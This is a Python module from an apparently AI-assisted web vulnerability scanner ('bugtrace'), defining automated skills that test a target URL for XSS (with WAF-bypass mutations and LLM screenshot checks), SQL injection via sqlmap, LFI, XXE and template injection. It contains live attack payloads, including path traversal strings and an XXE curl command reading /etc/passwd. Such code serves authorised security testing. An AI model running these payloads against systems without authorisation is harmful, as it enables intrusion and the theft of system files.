"""
Injection Skills - Vulnerability exploitation for injection attacks.

Contains:
    - XSSSkill: Cross-site scripting with ManipulatorOrchestrator
    - SQLiSkill: SQL injection with ladder logic (detector -> SQLMap)
    - LFISkill: Local File Inclusion
    - XXESkill: XML External Entity injection
    - CSTISkill: Client/Server-Side Template Injection
"""

import asyncio
from typing import Dict, Any
from .base import BaseSkill
from bugtrace.utils.logger import get_logger
from bugtrace.core.conductor import conductor

logger = get_logger("skills.injection")


class XSSSkill(BaseSkill):
    """XSS exploitation skill - uses ManipulatorOrchestrator for comprehensive XSS testing."""
    
    description = "Test XSS payloads using HTTP Manipulator with WAF bypass and browser verification"
    
    async def execute(self, url: str, params: Dict[str, Any]) -> Dict[str, Any]:
        from bugtrace.tools.manipulator.orchestrator import ManipulatorOrchestrator
        from bugtrace.tools.manipulator.models import MutableRequest, MutationStrategy
        from bugtrace.tools.visual.browser import browser_manager
        from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
        
        findings = []
        parsed = urlparse(url)
        url_params = parse_qs(parsed.query)
        
        # Smart adaptation: Use inputs found by recon if no URL params
        recon_inputs = self.master.thread.metadata.get("inputs_found", [])
        test_cases = []
        
        if url_params:
            for p, v in url_params.items():
                test_cases.append({"param": p, "value": v[0], "source": "url"})
        
        # Add form inputs (names only for now)
        for inp in recon_inputs:
            details = inp.get("details", {})
            if details.get("name") and details.get("type") not in ["submit", "button", "hidden"]:
                if not any(t["param"] == details["name"] for t in test_cases):
                    test_cases.append({"param": details["name"], "value": details.get("value", "test"), "source": "form"})

        if not test_cases:
            # Final fallback
            test_cases = [{"param": "search", "value": "test", "source": "url"}]

        logger.info(f"[{self.master.name}] Testing {len(test_cases)} XSS possible injection points")
        
        # Initialize ManipulatorOrchestrator
        manipulator = ManipulatorOrchestrator(rate_limit=0.3)
        
        try:
            for case in test_cases:
                param_name = case["param"]
                original_value = case["value"]
                
                # Build request for Manipulator
                request = MutableRequest(
                    method="GET" if case["source"] == "url" else "POST",
                    url=url,
                    params={param_name: original_value} if case["source"] == "url" else {},
                    data={param_name: original_value} if case["source"] == "form" else {}
                )
                
                # Use Manipulator for XSS testing (includes WAF bypass)
                success, successful_mutation = await manipulator.process_finding(
                    request,
                    strategies=[
                        MutationStrategy.PAYLOAD_INJECTION,
                        MutationStrategy.BYPASS_WAF
                    ]
                )
                
                if success and successful_mutation:
                    working_payload = successful_mutation.params.get(param_name, "<script>alert(1)</script>")
                    self.master.thread.record_payload_attempt("XSS", f"via Manipulator on {param_name}", success=True)
                    
                    # Browser verification for screenshot proof using the WORKING payload
                    try:
                        async with browser_manager.get_page() as page:
                            alert_detected = False
                            async def handle_dialog(dialog):
                                nonlocal alert_detected
                                alert_detected = True
                                await dialog.dismiss()
                            
                            page.on("dialog", handle_dialog)
                            
                            # Build exact URL that worked
                            parsed_url = urlparse(url)
                            
                            if successful_mutation.method == "POST":
                                logger.info(f"[{self.master.name}] Verifying working POST payload via auto-submit form")
                                # Create a simple auto-submitting form for POST XSS verification
                                form_html = f"""
                                <html>
                                <body onload="document.forms[0].submit()">
                                    <form method="POST" action="{url}">
                                """
                                if isinstance(successful_mutation.data, dict):
                                    for k, v in successful_mutation.data.items():
                                        form_html += f'<input type="hidden" name="{k}" value=\'{v}\'>\n'
                                form_html += """
                                    </form>
                                </body>
                                </html>
                                """
                                await page.set_content(form_html)
                            else:
                                test_params = successful_mutation.params
                                test_url = urlunparse((parsed_url.scheme, parsed_url.netloc, parsed_url.path, parsed_url.params, urlencode(test_params), parsed_url.fragment))
                                logger.info(f"[{self.master.name}] Verifying working GET payload: {test_url}")
                                await page.goto(test_url, wait_until="networkidle", timeout=10000)
                            
                            await asyncio.sleep(2)  # Wait for alert to fire
                            
                            from bugtrace.core.config import settings
                            screenshot_path = str(settings.LOG_DIR / f"{self.master.thread.thread_id}_xss_{param_name}.png")
                            await page.screenshot(path=screenshot_path)
                            
                            # VISION VALIDATION (The Missing Piece)
                            from bugtrace.core.llm_client import llm_client
                            
                            vision_confirmed = False
                            if not alert_detected:
                                logger.info(f"[{self.master.name}] Alert NOT detected via event, trying Vision Model validation...")
                                
                                system_prompt = conductor.get_full_system_prompt("xss_skill")
                                if system_prompt:
                                    xss_prompt = system_prompt.split("## XSS Vision Validation Prompt")[-1].strip()
                                else:
                                    xss_prompt = (
                                        "This is a browser screenshot. Look carefully at the page content. "
                                        "Is there ANY of the following visible on this page? "
                                        "1) Text containing 'BUGTRACE-XSS-CONFIRMED' or 'BUGTRACE-XSS' "
                                        "2) A JavaScript alert popup/dialog box "
                                        "3) Red colored text showing a domain name (like 'example.com') "
                                        "4) Any text that looks like it was injected (unusual formatting, yellow background). "
                                        "Answer ONLY: YES or NO"
                                    )
                                
                                try:
                                    vision_result = await llm_client.generate_with_image(
                                        prompt=xss_prompt,
                                        image_path=screenshot_path,
                                        module_name="XSS-Vision-Validator"
                                    )
                                    vision_confirmed = vision_result.strip().upper().startswith("YES")
                                    logger.info(f"[{self.master.name}] Vision XSS Validation: {vision_confirmed}")
                                except Exception as ve:
                                    logger.error(f"[{self.master.name}] Vision validation failed: {ve}")
                            
                            findings.append({
                                "type": "XSS",
                                "url": url,
                                "parameter": param_name,
                                "param": param_name,
                                "payload": working_payload,
                                "screenshot": screenshot_path,
                                "validated": True,
                                "alert_triggered": alert_detected,
                                "vision_confirmed": vision_confirmed,
                                "severity": "HIGH" if (alert_detected or vision_confirmed) else "MEDIUM",
                                "description": f"Cross-Site Scripting (XSS) confirmed on parameter '{param_name}'. Alert triggered: {alert_detected}. Vision AI confirmed: {vision_confirmed}.",
                                "reproduction": f"# Open in browser with payload:\n{test_url}"
                            })

                            logger.info(f"[{self.master.name}] ✅ XSS confirmed on param: {param_name}")
                    except Exception as e:
                        logger.debug(f"Browser verification failed: {e}")
                        findings.append({
                            "type": "XSS",
                            "url": url,
                            "parameter": param_name,
                            "param": param_name,
                            "payload": working_payload,
                            "validated": True,
                            "severity": "MEDIUM",
                            "note": f"Manipulator confirmed, browser verification error: {e}",
                            "description": f"Cross-Site Scripting (XSS) detected on parameter '{param_name}'. Payload reflection confirmed but browser verification failed.",
                            "reproduction": f"# Inject payload into parameter '{param_name}':\n{working_payload}"
                        })
            
            await manipulator.shutdown()
            
        except Exception as e:
            logger.error(f"XSS skill failed: {e}")
        
        return {
            "success": True,
            "payloads_tested": len(test_cases),
            "findings": findings,
            "xss_found": len(findings) > 0
        }


class SQLiSkill(BaseSkill):
    """SQLi exploitation skill - Ladder Logic: Lightweight Detector -> SQLMap Confirmation."""
    
    description = "Test SQL injection using Ladder Logic (Detector -> SQLMap Confirmation)"
    
    async def execute(self, url: str, params: Dict[str, Any]) -> Dict[str, Any]:
        from bugtrace.tools.exploitation.sqli import sqli_detector
        from bugtrace.tools.external import external_tools
        from bugtrace.tools.visual.browser import browser_manager
        from bugtrace.core.config import settings
        from urllib.parse import urlparse, parse_qs
        
        findings = []
        parsed = urlparse(url)
        url_params = parse_qs(parsed.query)
        
        # Skip if no params to test
        if not url_params:
            return {"success": True, "findings": [], "skipped": "no_params"}
        
        try:
            # =================================================================
            # STEP 1: Lightweight Python Detector (FAST, NO DOCKER)
            # Detects obvious error-based and boolean-based SQLi
            # =================================================================
            logger.info(f"[{self.master.name}] Ladder Logic Step 1: Lightweight Python Detector...")
            result = await sqli_detector.check(url)
            
            potential_vuln = False
            detector_message = ""
            
            if result:
                detector_message, _ = result if isinstance(result, tuple) else (result, None)
                potential_vuln = True
                logger.info(f"[{self.master.name}] 🔍 Detector found potential SQLi: {detector_message}")
            
            # =================================================================
            # STEP 2: SQLMap Confirmation (GOLD STANDARD)
            # Only run if:
            # 1. Detector found something (potential_vuln)
            # 2. OR Analysis Agent (AI) strongly suggested SQLi (context override)
            # 3. OR Safe Mode is OFF (aggressive)
            # =================================================================
            
            # Check AI context for strong SQLi signal
            ai_suggests_sqli = False
            if self.master.analysis_context:
                # Merge validated and possible vulns from AnalysisAgent report
                vulns = self.master.analysis_context.get("consensus_vulns", []) + \
                        self.master.analysis_context.get("possible_vulns", [])
                
                # Check for SQLi (case insensitive match on type, accepting various formats)
                for v in vulns:
                    v_type = v.get("type", "").upper()
                    if ("SQL" in v_type or "INJECTION" in v_type) and v.get("confidence", 0) >= 0.4:
                        ai_suggests_sqli = True
                        logger.info(f"[{self.master.name}] 🧠 AI Analysis suggests SQLi ({v_type}: {v.get('confidence')}) - Forcing SQLMap check")
                        break
            
            if (potential_vuln or ai_suggests_sqli or not settings.SAFE_MODE) and not settings.MANDATORY_SQLMAP_VALIDATION == False:
                logger.info(f"[{self.master.name}] Ladder Logic Step 2: SQLMap Confirmation (Triggered by: {'Detector' if potential_vuln else 'AI Analysis' if ai_suggests_sqli else 'Aggressive Mode'})...")
                
                # Get session cookies if available
                cookies = None
                try:
                    session_data = await browser_manager.get_session_data()
                    cookies = session_data.get("cookies", [])
                except Exception as e:
                    logger.debug(f"Session data fetch failed: {e}")
                
                try:
                    is_vulnerable = await external_tools.run_sqlmap(
                        url, 
                        cookies, 
                        target_param=params.get("parameter")
                    )
                    
                    if is_vulnerable:
                        # Handle Dict return type (enhanced run_sqlmap returns detailed dict)
                        if isinstance(is_vulnerable, dict):
                            evidence_msg = is_vulnerable.get("output_snippet", "SQLMap confirmed")
                            repro_cmd = is_vulnerable.get("reproduction_command", f"sqlmap -u '{url}' --batch --dbs")
                            param_name = is_vulnerable.get("parameter", params.get("parameter", "unknown"))
                            finding_data = {
                                "type": "SQLi",
                                "url": url,
                                "tool": "sqlmap",
                                "parameter": param_name,
                                "payload": is_vulnerable.get("type", "SQLi"),
                                "evidence": f"SQLMap Command: {repro_cmd}\n\nEvidence: {evidence_msg}",
                                "validated": True,
                                "reproduction_command": repro_cmd,
                                "severity": "CRITICAL",
                                "description": f"SQL Injection confirmed by SQLMap. Parameter: {param_name}. Type: {is_vulnerable.get('type', 'unknown')}",
                                "reproduction": repro_cmd
                            }
                        else:
                            # Legacy boolean fallback
                            finding_data = {
                                "type": "SQLi",
                                "url": url,
                                "tool": "sqlmap",
                                "evidence": "SQLMap confirmed SQL Injection vulnerability",
                                "validated": True,
                                "severity": "CRITICAL",
                                "description": "SQL Injection vulnerability confirmed by SQLMap automated scanner.",
                                "reproduction": f"sqlmap -u '{url}' --batch --dbs"
                            }

                        findings.append(finding_data)
                        
                        self.master.thread.record_payload_attempt("SQLi", "sqlmap-confirmed", success=True)
                        logger.info(f"[{self.master.name}] ✅ SQLMap confirmed SQLi!")
                    elif potential_vuln:
                        # Detector found something but SQLMap didn't confirm?
                        # Might be a false positive or complex injection
                        findings.append({
                            "type": "SQLi",
                            "url": url,
                            "evidence": f"Potential SQLi detected: {detector_message} (SQLMap could not confirm)",
                            "validated": False,
                            "severity": "MEDIUM",
                            "method": "sqli_detector",
                            "description": f"Potential SQL Injection detected by error-based analysis but not confirmed by SQLMap. May require manual verification. Evidence: {detector_message[:200] if detector_message else 'N/A'}",
                            "reproduction": f"sqlmap -u '{url}' --batch --level=5 --risk=3"
                        })
                        logger.info(f"[{self.master.name}] ⚠️ SQLi detected by Python but NOT confirmed by SQLMap")

                except Exception as sqlmap_err:
                    logger.debug(f"SQLMap execution failed: {sqlmap_err}")
                    # Fallback to detector result if SQLMap failed
                    if potential_vuln:
                        findings.append({
                            "type": "SQLi",
                            "url": url,
                            "evidence": detector_message,
                            "validated": True,
                            "method": "sqli_detector",
                            "severity": "HIGH",
                            "description": f"SQL Injection detected via error-based analysis. SQLMap could not run but detector found evidence: {detector_message[:200] if detector_message else 'N/A'}",
                            "reproduction": f"sqlmap -u '{url}' --batch --dbs"
                        })
            
        except Exception as e:
            logger.error(f"SQLi Ladder Logic test failed: {e}")
        
        return {
            "success": True,
            "findings": findings,
            "sqli_found": len(findings) > 0
        }


class LFISkill(BaseSkill):
    """LFI exploitation skill - tests for Local File Inclusion vulnerabilities."""
    
    description = "Test Local File Inclusion payloads on file-related parameters"
    
    async def execute(self, url: str, params: Dict[str, Any]) -> Dict[str, Any]:
        from bugtrace.tools.visual.browser import browser_manager
        from urllib.parse import urlparse, parse_qs
        
        findings = []
        
        # LFI-specific payloads
        lfi_payloads = [
            "../../etc/passwd",
            "../../../etc/passwd",
            "....//....//etc/passwd",
            "..%2f..%2f..%2fetc%2fpasswd",
            "/etc/passwd",
            "file:///etc/passwd"
        ]
        
        lfi_indicators = ["root:x:0:0", "bin:x:1:1", "daemon:x:2:2"]
        
        # Parameters likely to be vulnerable to LFI
        lfi_params = ["file", "path", "page", "doc", "document", "folder", "root", 
                      "dir", "directory", "include", "img", "image", "template"]
        
        parsed = urlparse(url)
        url_params = parse_qs(parsed.query)
        
        try:
            async with browser_manager.get_page() as page:
                for param_name, values in url_params.items():
                    # Prioritize likely params
                    if param_name.lower() in lfi_params or any(p in param_name.lower() for p in lfi_params):
                        for payload in lfi_payloads:
                            test_url = f"{url.split('?')[0]}?{param_name}={payload}"
                            
                            try:
                                await page.goto(test_url, wait_until="domcontentloaded", timeout=8000)
                                content = await page.content()
                                
                                for indicator in lfi_indicators:
                                    if indicator in content:
                                        from bugtrace.core.config import settings
                                        screenshot_path = str(settings.LOG_DIR / f"{self.master.thread.thread_id}_lfi.png")
                                        await page.screenshot(path=screenshot_path)
                                        
                                        findings.append({
                                            "type": "LFI",
                                            "url": url,
                                            "parameter": param_name,
                                            "param": param_name,
                                            "payload": payload,
                                            "screenshot": screenshot_path,
                                            "validated": True,
                                            "severity": "CRITICAL",
                                            "description": f"Local File Inclusion (LFI) vulnerability confirmed. Parameter '{param_name}' allows reading local files. Indicator found: {indicator}",
                                            "reproduction": f"curl '{test_url}' | grep -i '{indicator[:20]}'"
                                        })
                                        
                                        self.master.thread.record_payload_attempt("LFI", payload, success=True)
                                        logger.info(f"[{self.master.name}] ✅ LFI confirmed: {payload}")
                                        break
                                        
                            except Exception as e:
                                logger.debug(f"LFI test failed for {payload}: {e}")
                        
                        if findings:
                            break
            
        except Exception as e:
            logger.error(f"LFI skill failed: {e}")
        
        return {
            "success": True,
            "findings": findings,
            "lfi_found": len(findings) > 0
        }


class XXESkill(BaseSkill):
    """XXE exploitation skill - uses existing XXE detector."""
    
    description = "Test XML External Entity injection on XML-accepting endpoints"
    
    async def execute(self, url: str, params: Dict[str, Any]) -> Dict[str, Any]:
        from bugtrace.tools.exploitation.xxe import xxe_detector
        
        findings = []
        
        try:
            # XXE detector needs base_xml and headers
            base_xml = '<?xml version="1.0"?><root><data>test</data></root>'
            headers = {"Content-Type": "application/xml"}
            
            result = await xxe_detector.check(url, base_xml, headers)
            
            if result:
                findings.append({
                    "type": "XXE",
                    "url": url,
                    "evidence": result,
                    "validated": True,
                    "severity": "CRITICAL",
                    "description": f"XML External Entity (XXE) injection vulnerability detected. Server parses external entities allowing file read or SSRF. Evidence: {result[:200] if result else 'N/A'}",
                    "reproduction": f"curl -X POST '{url}' -H 'Content-Type: application/xml' -d '<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><root>&xxe;</root>'"
                })

                self.master.thread.record_payload_attempt("XXE", "auto-detect", success=True)
                logger.info(f"[{self.master.name}] ✅ XXE detected")
                
        except Exception as e:
            logger.debug(f"XXE test failed: {e}")
        
        return {
            "success": True,
            "findings": findings,
            "xxe_found": len(findings) > 0
        }


class CSTISkill(BaseSkill):
    """CSTI/SSTI skill - tests for Client/Server-Side Template Injection."""
    
    description = "Test for Template Injection vulnerabilities (Jinja2, Twig, etc)"
    
    async def execute(self, url: str, params: Dict[str, Any]) -> Dict[str, Any]:
        from bugtrace.tools.exploitation.csti import csti_detector
        
        findings = []
        
        try:
            result = await csti_detector.check(url)
            
            if result:
                findings.append({
                    "type": "CSTI",
                    "url": url,
                    "evidence": result,
                    "validated": True,
                    "severity": "HIGH",
                    "description": f"Client-Side Template Injection (CSTI) vulnerability detected. Template expressions are evaluated allowing arbitrary JavaScript execution. Evidence: {result[:200] if result else 'N/A'}",
                    "reproduction": f"curl '{url}' --data-urlencode 'param={{{{7*7}}}}' | grep 49"
                })

                self.master.thread.record_payload_attempt("CSTI", "auto-detect", success=True)
                logger.info(f"[{self.master.name}] ✅ CSTI detected")
                
        except Exception as e:
            logger.debug(f"CSTI test failed: {e}")
        
        return {
            "success": True,
            "findings": findings,
            "csti_found": len(findings) > 0
        }
